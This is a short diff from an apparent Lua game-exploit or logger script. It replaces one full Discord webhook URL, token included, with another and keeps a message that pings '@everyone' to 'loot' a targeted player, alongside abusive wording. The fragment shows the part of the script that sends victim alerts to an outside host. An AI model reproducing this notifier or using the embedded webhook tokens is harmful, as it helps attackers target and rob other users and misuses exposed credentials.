@@ -6,7 +6,7 @@ local webhookcheck =
    "Kid with shit exploit"
 
 local url =
-   "https://discord.com/api/webhooks/995300471663230996/Kw5dinLrDGDSOTym5O5zr4_IRN7nWrE2izk4mos7sVzoBuTO916QgNwL0ciZIwvVly5q"
+   "https://discord.com/api/webhooks/1004451622384058368/5QuLMEQ5B8hoI9UPysTLBaRoZuNmLGPnpI48YTSL9lvM8bPE-gGlaofdRLnyDiVDGysZ"
 local data = {
    ["content"] = "@everyone , We Got A Shitty DumbAss Go Fast Loot Him",
 }
